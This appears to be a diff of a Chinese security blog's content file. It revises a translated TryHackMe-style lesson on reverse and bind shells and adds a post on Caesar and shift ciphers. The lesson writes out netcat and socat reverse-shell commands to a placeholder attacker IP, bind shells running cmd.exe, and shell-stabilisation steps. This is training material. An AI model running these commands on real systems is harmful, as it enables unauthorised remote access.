 <li>默认情况下，几乎每个 Linux 发行版都安装了 Netcat。但默认情况下很少安装 Socat。</li>
@@ -13450,26 +13212,34 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
 <p>Metasploit 框架的 <code>auxiliary/multi/handler</code> 模块与 socat 和 netcat 一样，用于接收 reverse shell。由于是 Metasploit 框架的一部分，multi&#x2F;handler 提供了一种成熟的方式来获取稳定的 shell，并提供了多种进一步的选项来改进捕获的 shell。它也是与 meterpreter shell 交互的唯一方式，也是处理分阶段有效载荷的最简单方式——我们将在任务 9 中查看这两种方式。</p>
 <p><strong>Msfvenom：</strong></p>
 <p>与 multi&#x2F;handler 一样，msfvenom 在技术上是 Metasploit 框架的一部分，但是，它作为独立工具提供。 Msfvenom 用于动态生成有效载荷。虽然 msfvenom 可以生成除 reverse 和 bind shell 之外的有效负载，但这些是我们将在本会议室中重点关注的内容。<br>Msfvenom 是一个非常强大的工具，因此我们将在专门的任务中更详细地介绍它的应用程序。 </p>
-<p>除了我们已经介绍过的工具之外，还有许多不同语言的一些 shell 存储库。其中最突出的一个是 <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">Payloads all the Things</a>。 PentestMonkey <a href="https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse Shell Cheatsheet</a> 也很常用。除了这些在线资源，Kali Linux 还预装了位于 <code>/usr/share/webshells</code> 的各种 webshell。 <a href="https://github.com/danielmiessler/SecLists">SecLists repo</a> 虽然主要用于单词列表，但也包含一些用于获取 shell 的非常有用的代码。</p>
+<p>除了我们已经介绍过的工具之外，还有许多不同语言的一些 shell 存储库。其中最突出的一个是 <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">Payloads all the Things</a>。 PentestMonkey 的 <a href="https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse Shell Cheatsheet</a> 也很常用。除了这些在线资源，Kali Linux 还预装了位于 <code>/usr/share/webshells</code> 的各种 webshell。 <a href="https://github.com/danielmiessler/SecLists">SecLists repo</a> 虽然主要用于单词列表，但也包含一些用于获取 shell 的非常有用的代码。</p>
 <h3 id="23-shell-的类型"><a href="#2-3-Shell-的类型" class="headerlink" title="2.3 Shell 的类型"></a>2.3 Shell 的类型</h3><p>在高层次上，我们对利用目标的两种 shell 感兴趣：Reverse shell 和 bind shell。</p>
 <ul>
-<li><p><strong>Reverse shell</strong> 是指目标被迫连接到您的计算机。在您自己的计算机上，您可以使用上一个任务中提到的工具之一来设置用于接收连接的侦听器。反向 shell 是绕过防火墙规则的好方法，防火墙规则可能会阻止您连接到目标上的任意端口；然而，缺点是，当通过 Internet 从一台机器接收 shell 时，您需要配置自己的网络以接受 shell。（最经典的例子就是使用阿里的云服务器时要修改安全组规则）</p>
+<li><p><strong>Reverse shell</strong> 是指目标被迫连接到您的计算机。在您自己的计算机上，您可以使用上一个任务中提到的工具之一来设置用于接收连接的侦听器。反向 shell 是绕过防火墙规则的好方法，因为防火墙规则可能会阻止您连接到目标上的任意端口。注意当通过 Internet 从一台机器接收 shell 时，您需要配置自己的网络以接受 shell。（最经典的例子就是使用阿里的云服务器时要修改安全组规则）</p>
 </li>
 <li><p><strong>bind shell</strong> 是指当目标上的代码被执行时，我们直接让其打开一个附加到 shell 上的监听器，也就是端口。端口将会向互联网开放，这意味着您可以连接到代码打开的端口并以这种方式获得远程代码执行的能力。这具有不需要在您自己的网络上进行任何配置的优点，但可能会被保护目标的防火墙阻止。 作为一般规则，反向 shell 更容易执行和调试，但是，我们将在下面介绍这两个示例。不要太担心这里的语法：我们将在接下来的任务中查看它。请注意以下模拟中 reverse 和 bind shell 之间的区别。</p>
 </li>
 </ul>
-<p>Reverse Shell 的例子：</p>
+<p><strong>Reverse Shell 的例子：</strong></p>
 <p>让我们从更常见的反向 shell 开始。 十分之九，这就是您想要的——尤其是在像 TryHackMe 这样的 CTF 挑战中。 看看下面的图片。在左侧，我们有一个反向 shell 侦听器——这是接收连接的地方。右边是发送反向shell的模拟。实际上，这更有可能通过远程网站上的代码注入或类似的方式来完成。把左边的图像想象成你自己的电脑，把右边的图像想象成目标。 </p>
-<p>在攻击机器上：<br><code>sudo nc -lvnp 443</code></p>
-<p>在目标机器上：<br><code>nc &lt;LOCAL-IP&gt; &lt;PORT&gt; -e /bin/bash</code></p>
+<p>在攻击机器上：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nc -lvnp <span class="hljs-number">443</span><br></code></pre></td></tr></table></figure>
+
+<p>在目标机器上：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml">nc <span class="hljs-tag">&lt;<span class="hljs-name">LOCAL-IP</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">PORT</span>&gt;</span> -e /bin/bash<br></code></pre></td></tr></table></figure>
+
 <p><img src="https://i.imgur.com/L7xHtHv.png"></p>
 <p>请注意，在运行右侧的命令后，侦听器会收到一个连接。当运行 whoami 命令时，我们看到我们正在以目标用户身份执行命令。这里重要的是我们正在监听我们自己的攻击机器，并从目标发送连接。</p>
 <blockquote>
 <p>nc 的 -e 选项表示在连接成功后要执行的命令，这里表示连接成功之后把自己的 bash 发送到另一端<br>bind shell 例子：</p>
 </blockquote>
 <p>bind shell 不太常见，但仍然非常有用。 再一次，看看下面的图片。同样，在左侧我们有攻击者的计算机，在右侧我们有一个模拟目标。只是为了稍微调整一下，这次我们将使用 Windows 目标。首先，我们在目标上启动一个侦听器——这次我们还告诉它执行 cmd.exe。然后，在侦听器启动并运行的情况下，我们从自己的机器连接到新打开的端口。</p>
-<p>在目标机上：<br><code>nc -lvnp &lt;port&gt; -e &quot;cmd.exe&quot;</code></p>
-<p>在攻击机上：<br><code>nc MACHINE_IP &lt;port&gt;</code></p>
+<p>在目标机上：</p>
+<figure class="highlight gherkin"><table><tr><td class="code"><pre><code class="hljs gherkin">nc -lvnp <span class="hljs-variable">&lt;port&gt;</span> -e <span class="hljs-string">&quot;cmd.exe&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>在攻击机上：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml">nc MACHINE_IP <span class="hljs-tag">&lt;<span class="hljs-name">port</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
 <p><img src="https://i.imgur.com/Twbii0P.png"></p>
 <p>如您所见，这再次让我们在远程机器上执行代码。请注意，这并非特定于 Windows。 这里要理解的重要一点是目标在监听特定端口，然后我们主动连接到目标的这个端口。</p>
 <p>与此任务相关的最后一个概念是交互性。外壳可以是交互式的，也可以是非交互式的。 </p>
@@ -13479,51 +13249,80 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
 <p><img src="https://i.imgur.com/G6sfzlQ.png"></p>
 <p>在这里您可以看到它以交互方式询问用户键入是或否以继续连接。这是一个交互式程序，需要交互式 shell 才能运行。</p>
 <ul>
-<li>非交互式 shell 不会给你那种 “奢侈” 。在非交互式 shell 中，您只能使用不需要用户交互即可正常运行的程序。不幸的是，大多数简单的反向和 bind shell 都是非交互式的，这会使进一步的利用变得更加棘手。让我们看看当我们尝试在非交互式 shell 中运行 SSH 时会发生什么：</li>
+<li>非交互式 shell 不会给你那种 “奢侈” 。在非交互式 shell 中，您只能使用不需要用户交互即可正常运行的程序。不幸的是，大多数简单的 reverse shell 和 bind shell 都是非交互式的，这会使进一步的利用变得更加棘手。让我们看看当我们尝试在非交互式 shell 中运行 SSH 时会发生什么：</li>
 </ul>
 <p><img src="https://i.imgur.com/RLywVYp.png"></p>
-<p>请注意，whoami 命令（非交互式）执行得很好，但 ssh 命令（交互式）根本没有给我们任何输出。作为一个有趣的旁注，交互式命令的输出确实会出现在某个地方，但是，弄清楚在哪里是您自己尝试的练习。可以说交互式程序在非交互式 shell 中不起作用。 此外， 上图的 listener 命令是用于演示的攻击机独有的别名，是键入 <code>sudo rlwrap nc -lvnp 443</code> 的简写方式，将在后续任务中介绍。除非已在本地配置别名，否则它将无法在任何其他计算机上运行。</p>
+<p>请注意，<code>whoami</code> 命令（非交互式）执行得很好，但 ssh 命令（交互式）根本没有给我们任何输出。</p>
+<blockquote>
+<p>作为一个有趣的旁注，交互式命令的输出确实会出现在某个地方，但是，弄清楚在哪里是您自己尝试的练习。可以说交互式程序在非交互式 shell 中不起作用。 此外， 上图的 listener 命令是用于演示的攻击机独有的别名，是键入 <code>sudo rlwrap nc -lvnp 443</code> 的简写方式，将在后续任务中介绍。除非已在本地配置别名，否则它将无法在任何其他计算机上运行。</p>
+</blockquote>
 <p><strong>回答下列问题：</strong></p>
 <ol>
-<li>哪种类型的外壳连接回您计算机上的侦听端口，反向 (R) 或绑定 (B)？</li>
-<li>您已将恶意 shell 代码注入网站。您收到的外壳可能是交互式的吗？ （是或否）</li>
+<li>哪种类型的 shell 会连接回您计算机上的侦听端口，反向 (R) 或绑定 (B)？</li>
+<li>您已将恶意 shell 代码注入网站。您收到的 shell 可能是交互式的吗？ （是或否）</li>
 <li>使用绑定 shell 时，您会在攻击者 (A) 还是目标 (T) 上执行侦听器？</li>
 </ol>
 <h3 id="24-netcat"><a href="#2-4-Netcat" class="headerlink" title="2.4 Netcat"></a>2.4 Netcat</h3><p>如前所述，Netcat 是渗透测试人员工具包中最基本的工具，涉及任何类型的网络。有了它，我们可以做各种各样有趣的事情，但现在让我们关注 shell。</p>
-<p>++Reverse Shells++</p>
-<p>在前面的任务中，我们看到反向 shell 需要 shellcode 和一个侦听器。执行 shell 的方法有很多种，因此我们将从查看侦听器开始。 使用 Linux 启动 netcat 侦听器的语法如下：<br><code>nc -lvnp &lt;端口号&gt; </code></p>
+<p><strong>Reverse Shells</strong></p>
+<p>在前面的任务中，我们看到反向 shell 需要 shellcode 和一个侦听器。执行 shell 的方法有很多种，因此我们将从查看侦听器开始。 使用 Linux 启动 netcat 侦听器的语法如下：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">nc -lvnp &lt;端口号&gt; <br></code></pre></td></tr></table></figure>
+
+
 <ul>
 <li>-l 用于告诉 netcat 这将是一个监听器</li>
 <li>-v 用于请求详细输出 </li>
-<li>-n 告诉 netcat 不解析主机名或使用 DNS。对此进行解释超出了会议室的范围。 </li>
+<li>-n 告诉 netcat 不解析主机名或使用 DNS。</li>
 <li>-p 表示要监听的端口。</li>
 </ul>
 <p>上一个任务中的示例使用端口 443。实际上，您可以使用任何您喜欢的端口，只要还没有服务使用它即可。请注意，如果您选择使用低于 1024 的端口，则在启动侦听器时需要使用 <code>sudo</code>。</p>
 <p>使用众所周知的端口号（80、443 或 53 是不错的选择）通常是个好主意，因为这更有可能通过目标上的出站防火墙规则。 一个工作示例是： <code>sudo nc -lvnp 443</code> 然后，我们可以使用任意数量的有效载荷连接回此目标，具体取决于目标上的环境。 上一个任务中显示了这方面的示例。 </p>
-<p>++Bind Shells++</p>
-<p>如果我们希望在目标上获得 bind shell，那么我们可以假设已经有一个侦听器在目标的选定端口上等待我们：我们需要做的就是连接到它。其语法相对简单： <code>nc &lt;目标IP&gt; &lt;选择的端口&gt;</code><br>在这里，我们使用 netcat 在我们选择的端口上建立到目标的出站连接。 我们将在任务 8 中查看使用 netcat 为此类 shell 创建侦听器。这里重要的是您了解如何使用 netcat 连接到侦听端口。</p>
+<p><strong>Bind Shells</strong></p>
+<p>如果我们希望在目标上获得 bind shell，那么我们可以假设已经有一个侦听器在目标的选定端口上等待我们：我们需要做的就是连接到它。其语法相对简单： <code>nc &lt;目标IP&gt; &lt;选择的端口&gt;</code><br>在这里，我们使用 netcat 在我们选择的端口上建立到目标的出站连接。</p>
 <h3 id="25-加固-netcat-shell"><a href="#2-5-加固-Netcat-shell" class="headerlink" title="2.5 加固 Netcat shell"></a>2.5 加固 Netcat shell</h3><p>好的，我们已经捕获或连接到一个 netcat shell，接下来呢？</p>
-<p>默认情况下，这些 shell 非常不稳定。按 Ctrl + C 会断开 shell。它们是非交互式的，并且经常有奇怪的格式错误。这是因为 netcat shell 实际上是在终端内运行的进程，而不是真正的终端本身。幸运的是，有很多方法可以稳定 Linux 系统上的 netcat shell。我们将在这里查看三个。 Windows 反向 shell 的稳定性往往要困难得多（指 windows 的反弹 shell 更不稳定、更加难以加固）；但是，我们将在此处介绍的第二种技术对此特别有用。</p>
-<h4 id="技术-1python"><a href="#技术-1：Python" class="headerlink" title="技术 1：Python"></a>技术 1：Python</h4><p>我们要讨论的第一种技术仅适用于 Linux 机器，因为它们几乎总是默认安装 Python。这是一个三阶段过程： </p>
+<p>默认情况下，这些 shell 非常不稳定。按 Ctrl + C 会断开 shell。它们是非交互式的，并且经常有奇怪的格式错误。这是因为 netcat shell 实际上是在终端内运行的进程，而不是真正的终端本身。幸运的是，有很多方法可以稳定 Linux 系统上的 netcat shell。我们将在这里查看三个。 而加固 Windows 反向 shell 往往要困难得多。但是，我们将在此处介绍的第二种技术对此特别有用。</p>
+<h4 id="技术-1python"><a href="#技术-1：Python" class="headerlink" title="技术 1：Python"></a>技术 1：Python</h4><p>由于 Linux 机器默认安装 python，所以技术 1 主要适用于 Linux 机器。这是一个三阶段过程： </p>
 <ol>
-<li><p>首先要做的是在目标机的 shell 上（无论是反向的还是正向的）执行如下命令</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)</span><br></code></pre></td></tr></table></figure>
-<p>它使用 Python 生成功能更好的 bash shell；请注意，某些目标可能需要指定的 Python 版本。如果是这种情况，请根据需要将 python 替换为 python2 或 python3。此时我们的 shell 看起来会更漂亮一些，但我们仍然无法使用 tab 键进行自动补齐，并且 Ctrl + C 仍会终止 shell。 </p>
+<li>首先要做的是在目标的 shell 上（无论是反向的还是正向的）执行如下命令<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)</span><br></code></pre></td></tr></table></figure>
+它使用 Python 生成功能更好的 bash shell。请注意，某些目标可能需要指定 Python 版本，如果是这种情况，请根据需要将 python 替换为 python2 或 python3。</li>
+</ol>
+<p>注意：命令执行完毕后，我们的 shell 看起来会更漂亮一些，但我们仍然无法使用 tab 键进行自动补齐，并且 Ctrl + C 仍会终止 shell。 </p>
+<ol start="2">
+<li><p>第二步继续在目标机的 shell 上执行 </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> TERM=xterm<br></code></pre></td></tr></table></figure>
+
+<p>这将使我们能够访问诸如 <code>clear</code> 之类的术语命令。 </p>
 </li>
-<li><p>第二步是在目标机的 shell 上执行 <code>export TERM=xterm</code> 命令。这将使我们能够访问诸如 clear 之类的术语命令。 </p>
-</li>
-<li><p>最后也是最重要的，使用 Ctrl + Z 挂起 shell 回到我们的终端并使用 <code>stty raw -echo;fg</code> 命令。这个命令做了两件事情：首先，它关闭了我们的终端回显（这允许我们可以使用 tab 自动补齐以及在shell内部输入 Ctrl + C 终止进程），第二则是回到靶机的shell上从而完成整个稳固shell的过程。</p>
+<li><p>最后也是最重要的，使用 Ctrl + Z 挂起 shell 回到我们的终端并输入</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span>;<span class="hljs-built_in">fg</span><br></code></pre></td></tr></table></figure>
+
+<p>这个命令做了两件事情：首先，它关闭了我们的终端回显（这允许我们可以使用 tab 自动补齐以及在 shell 内部输入 Ctrl + C 终止进程），第二则是回到靶机的 shell 上从而完成整个稳固 shell 的过程。</p>
 </li>
 </ol>
 <p>下图是一个完整的示例：</p>
 <p><img src="https://i.imgur.com/7gFg6c7.png"></p>
 <blockquote>
-<p>注意到如果shell断开了，那么在你的终端上的任意输入都将不可见（这是禁用了终端回显的结果）。可以输入 <code>reset</code> 命令修复这一点</p>
+<p>注意到如果 shell 断开了，那么在你的终端上的任意输入都将不可见（这是禁用了终端回显的结果）。可以输入 <code>reset</code> 命令修复这一点</p>
 </blockquote>
-<h4 id="技术-2rlwrap"><a href="#技术-2：rlwrap" class="headerlink" title="技术 2：rlwrap"></a>技术 2：rlwrap</h4><p>rlwrap 是一个程序，简单来说，它让我们在收到 shell 后立即访问历史记录、tab 自动完成和箭头键；但是，如果您希望能够在 shell 中使用 Ctrl + C，则仍需进行一些手工操作。 Kali 默认没有安装 rlwrap，所以首先使用 <code>sudo apt install rlwrap</code> 安装它。 </p>
-<p>要使用 rlwrap，我们调用一个稍微不同的侦听器： <code>rlwrap nc -lvnp &lt;端口&gt;</code> </p>
-<p>在我们的 netcat 侦听器前面加上 “rlwrap” 可以为我们提供一个功能更齐全的 shell。这种技术在处理 Windows shell 时特别有用。(众所周知 Windows shell 很不稳固)。在处理 Linux 目标时，可以使用与前面技术的第三步中相同的技巧来完全稳定：使用 Ctrl + Z 挂起 shell，然后使用 <code>stty raw -echo； fg</code> 加固 shell 并重新进入。 </p>
-<h4 id="技术-3socat"><a href="#技术-3：Socat" class="headerlink" title="技术 3：Socat"></a>技术 3：Socat</h4><p>稳定 shell 的第三种简单方法是非常简单地使用初始 netcat shell 作为进入功能更全的 socat shell 的垫脚石。<strong>请记住，此技术仅限于 Linux 目标</strong>，因为 Windows 上的 Socat shell 不会比 netcat shell 更稳定。为了实现这种稳定方法，我们首先将一个 <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true">socat 静态编译的二进制文件</a>（一个编译为没有依赖关系的程序版本）传输到目标机器。<br>实现此目的的典型方法是在包含 socat 二进制文件的目录内的攻击机器上使用 web服务器（输入以下命令开启一个 web 服务器：<code>sudo python3 -m http.server 80</code>），然后在目标机器上使用 netcat shell 下载文件。在 Linux 上，这将通过 <code>curl</code> 或 <code>wget</code> (<code>wget &lt;LOCAL-IP&gt;/socat -O /tmp/socat</code>) 来完成。 为了完整起见：在 Windows CLI 环境中，可以使用 Powershell 完成相同的操作，使用 <code>Invoke-WebRequest</code> 或 webrequest 系统类，具体取决于安装的 Powershell 版本（<code>Invoke-WebRequest -uri &lt;LOCAL-IP&gt;/socat .exe -outfile C:\\Windows\temp\socat.exe</code>）。我们将在接下来的任务中介绍使用 Socat 发送和接收 shell 的语法。 </p>
+<h4 id="技术-2rlwrap"><a href="#技术-2：rlwrap" class="headerlink" title="技术 2：rlwrap"></a>技术 2：rlwrap</h4><p>rlwrap 是一个程序，简单来说，它能让我们在收到 shell 后立即拥有 tab 键自动补齐功能。但是，如果您希望能够在 shell 中使用 Ctrl + C，则仍需进行一些手工操作。 Kali 默认没有安装 rlwrap，所以首先使用如下命令安装它。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">sudo apt install rlwrap<br></code></pre></td></tr></table></figure>
+
+<p>使用如下命令调用 rlwrap 的侦听器：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">rlwrap nc -lvnp &lt;端口&gt;<br></code></pre></td></tr></table></figure>
+
+<p>在我们的 netcat 侦听器前面加上 “rlwrap” 可以为我们提供一个功能更齐全的 shell。这种技术在处理 Windows shell 时特别有用。(众所周知 Windows shell 很不稳固)。在处理 Linux 目标时，可以使用与前面技术的第三步中相同的技巧来完全稳定：使用 Ctrl + Z 挂起 shell，然后使用 </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span>； <span class="hljs-built_in">fg</span><br></code></pre></td></tr></table></figure>
+
+<p> 加固 shell 并重新进入。 </p>
+<h4 id="技术-3socat"><a href="#技术-3：Socat" class="headerlink" title="技术 3：Socat"></a>技术 3：Socat</h4><p>加固 shell 的第三种简单的方法是以 netcat shell 为基础得到一个 socat shell，因为 socat shell 在 linux 上比 netcat shell 稳定。</p>
+<blockquote>
+<p><strong>请记住，此技术仅限于 Linux 目标</strong>，因为 Windows 上的 Socat shell 不会比 netcat shell 更稳定。</p>
+</blockquote>
+<p>为了实现这种稳定方法，我们首先将一个 <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true">socat 静态编译的二进制文件</a>（一个编译为没有依赖关系的程序版本）传输到目标机器。</p>
+<p>实现此目的的典型方法是在包含 socat 二进制文件的目录内的攻击机器上使用 web服务器</p>
+<p>输入以下命令开启一个 web 服务器：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">sudo python3 -m http.server 80<br></code></pre></td></tr></table></figure>
+
+<p>然后在目标机器上使用 netcat shell 下载文件。在 Linux 上，这将通过 <code>curl</code> 或 <code>wget</code> (<code>wget &lt;LOCAL-IP&gt;/socat -O /tmp/socat</code>) 来完成。 为了完整起见：在 Windows CLI 环境中，可以使用 Powershell 完成相同的操作，使用 <code>Invoke-WebRequest</code> 或 webrequest 系统类，具体取决于安装的 Powershell 版本（<code>Invoke-WebRequest -uri &lt;LOCAL-IP&gt;/socat .exe -outfile C:\\Windows\temp\socat.exe</code>）。我们将在接下来的任务中介绍使用 Socat 发送和接收 shell 的语法。 </p>
 <p>使用上述任何技术，能够更改终端 tty 大小是很有用的。这是您的终端在使用常规 shell 时会自动执行的操作；但是，如果您想使用类似文本编辑器的东西来覆盖屏幕上的所有内容，则必须在反向或绑定 shell 中手动完成。<br>首先，打开另一个终端并运行 <code>stty -a</code>。这将为您提供大量输出。记下 “rows” 和 columns 的值： </p>
 <p><img src="https://i.imgur.com/v2oeT3e.png"></p>
 <p>接下来，在您的 reverse &#x2F; bind shell 中，键入： <code>stty 行 &lt;数字&gt; 和 stty cols &lt;数字&gt;</code> 填写您在自己的终端中运行命令获得的数字。 这将改变终端的注册宽度和高度，从而使得文本编辑器等依赖此类信息准确的程序正确打开。</p>
@@ -13532,10 +13331,13 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
 <li>您将如何将终端大小更改为 238 列？</li>
 <li>在端口 80 上设置 Python3 网络服务器的语法是什么？</li>
 </ol>
-<h3 id="26-socat"><a href="#2-6-Socat" class="headerlink" title="2.6 Socat"></a>2.6 Socat</h3><p>Socat 在某些方面与 netcat 相似，但在许多其他方面有根本的不同。考虑 socat 的最简单方法是将其作为两点之间的连接器。在这个房间内，这基本上是一个监听端口和键盘，但是，它也可以是一个监听端口和一个文件，或者实际上是两个监听端口。 socat 所做的只是提供两点之间的链接——很像 Portal 游戏中的 portal gun！ </p>
+<h3 id="26-socat"><a href="#2-6-Socat" class="headerlink" title="2.6 Socat"></a>2.6 Socat</h3><p>Socat 在某些方面与 netcat 相似，但在许多其他方面有根本的不同。socat 简单来说是网络中两点之间的连接器。在这个房间内，这基本上是一个监听端口和键盘，但是，它也可以是一个监听端口和一个文件，或者实际上是两个监听端口。 socat 所做的只是提供两点之间的链接——很像 Portal 游戏中的 portal gun！ </p>
 <p>再一次，让我们从反向 shell 开始。</p>
-<h4 id="反向-shell"><a href="#反向-shell" class="headerlink" title="反向 shell"></a>反向 shell</h4><p>如前所述，socat 的语法比 netcat 的语法难得多。下面是 socat 中基本反向 shell 侦听器的语法：<br><code>socat TCP-L:&lt;端口&gt; -</code><br>与 socat 一样，这需要两个点（监听端口和标准输入）并将它们连接在一起。生成的 shell 是不稳定的，但这将适用于 Linux 或 Windows，并且等效于 <code>nc -lvnp &lt;port&gt;</code>。<br>在 Windows 上，我们将使用此命令进行回连：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; <br>EXEC:powershell.exe,pipes <br></code></pre></td></tr></table></figure>
+<h4 id="反向-shell"><a href="#反向-shell" class="headerlink" title="反向 shell"></a>反向 shell</h4><p>如前所述，socat 的语法比 netcat 的语法难得多。下面是 socat 中启动反向 shell 侦听器的语法：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">socat TCP-L:&lt;端口&gt; -<br></code></pre></td></tr></table></figure>
+
+<p>与 netcat 一样，这需要两个点（监听端口和标准输入）并将它们连接在一起。生成的 shell 是不稳定的，但这将适用于 Linux 或 Windows，并且等效于 <code>nc -lvnp &lt;port&gt;</code>。<br>在 Windows 上，我们将使用此命令进行回连：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:powershell.exe,pipes <br></code></pre></td></tr></table></figure>
 <p> “pipes” 选项用于强制 powershell（或 cmd.exe）使用 Unix 风格的标准输入和输出。<br> 这是 Linux 目标的等效命令：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; <br>EXEC:<span class="hljs-string">&quot;bash -li&quot;</span><br></code></pre></td></tr></table></figure>
 <h4 id="bind-shells"><a href="#Bind-Shells" class="headerlink" title="Bind Shells"></a>Bind Shells</h4><p>在 Linux 目标上，我们将使用以下命令：</p>
@@ -14730,6 +14532,348 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
       </categories>
       <tags>
         <tag>西湖论剑</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>1-3_古典密码学和它们的密码分析</title>
+    <url>/2023/02/28/1-3-%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%AD%A6%E5%92%8C%E5%AE%83%E4%BB%AC%E7%9A%84%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90/index.html</url>
+    <content><![CDATA[<!--toc-->
+
+<p>今日记录一下 1.3 小节</p>
+<span id="more"></span>
+
+<h1 id="13-古典密码学和它们的密码分析"><a href="#1-3-古典密码学和它们的密码分析" class="headerlink" title="1.3 古典密码学和它们的密码分析"></a>1.3 古典密码学和它们的密码分析</h1><p>在我们对古典密码学的研究中，我们将会解释一些古典的加密方案并证明它们是不安全的。</p>
+<p>我们的主要目标是：</p>
+<ol>
+<li><p>强调密码学的启发式方法的弱点，并以此导出将会在本书剩余部分采用的现代的、严谨的方法。</p>
+</li>
+<li><p>证明实现安全加密的简单方法是不可能成功的</p>
+</li>
+</ol>
+<p>沿着这种方式，我们将给出一些受这些古典方案启发的密码学的核心原则。</p>
+<p>在这一节中，为表述清晰，明文字符写作小写，密文字符写作大写。</p>
+<h2 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h2><p>有记录的最古老的密码之一，被称为凯撒密码，由  De Vita Caesarum, Divus Iulius 所描述，写于大约公元 110 年。</p>
+<p>凯撒通过将字母表中的字符向前移位 3 个位置来进行加密。a 被加密成 D，b 被加密成 E，以此类推。字母表的后几个字母会进行环绕，也就是 z 被加密成 C，y 被加密成 B，x 被加密成 A。</p>
+<p>举个例子，加密信息 <code>begin the attack now</code>，移除掉空格得到密文：</p>
+<p><code>EHJLQWKHDWWDFNQRZ</code></p>
+<p>显而易见的问题是该密码的加密方法是固定的；没有密钥。所以，任何学过凯撒密码的人都可以轻易地解密。</p>
+<p>有趣地是，该密码的一个 称为 ROT-13 的变种（移位变成了 13 而不是 3）在各种在线论坛中仍被使用。我们要明白这种加密不能提供任何密码学的安全性；其仅用于确保文本是难以理解的，除非信息的阅读者决定自己解密它。</p>
+<h2 id="移位密码和充足的密钥空间原则"><a href="#移位密码和充足的密钥空间原则" class="headerlink" title="移位密码和充足的密钥空间原则"></a>移位密码和充足的密钥空间原则</h2><p>移位密码可看作是凯撒密码的一个有密钥的变种。特别地，在移位密码中，密钥 k 是一个 0 到 25 之间的数字。为进行加密，字母就像在凯撒密码中那样被移位，但现在移位 k 个位置。</p>
+<p>将其映射到之前的加密语法。</p>
+<ol>
+<li><p>明文空间由任意长的英文字母串构成，并将标点符号、空格、数字移除，同时不区分大小写。</p>
+</li>
+<li><p>算法 GEN 输出一个唯一的密钥 $k\in{0,….,25}$ </p>
+</li>
+<li><p>算法 Enc 以密钥 k 和明文作为输入，将明文中的每个字母向前移位k个位置（在字母表末尾环绕）</p>
+</li>
+<li><p>算法 Dec 以密钥 k 和密文作为输入，并将密文中的每个字母向后移位k个位置。</p>
+</li>
+</ol>
+<p>我们可以通过将英文字母表用集合 ${0,…,25}$ （因此 a&#x3D;0，b&#x3D;1，以此类推）来表示从而得到一个更加数学化的描述。然后明文空间 M 就是该集合中任意的有限整数序列。</p>
+<p>我们通过下图表示使用密钥k的信息 $m&#x3D;m_1…m_e$ 的加密</p>
+<p><img src="/images/1-3-%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%AD%A6%E5%92%8C%E5%AE%83%E4%BB%AC%E7%9A%84%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90/image-20230228153638163.png" alt="image-20230228153638163"></p>
+<p>[a mod N] 表示 a除以N的余数，所以 0&lt;&#x3D; [a mod N] &lt; N。我们称将 a 映射到 [a mod N] 的过程为 模N 约化。</p>
+<p>下图表示使用密钥k的密文c&#x3D;c1…ce的解密：</p>
+<p><img src="/images/1-3-%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%AD%A6%E5%92%8C%E5%AE%83%E4%BB%AC%E7%9A%84%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90/image-20230228153947952.png" alt="image-20230228153947952"></p>
+<p>移位密码安全吗？在继续阅读之前，尝试解密以下使用移位密码和密钥k生成的密文：</p>
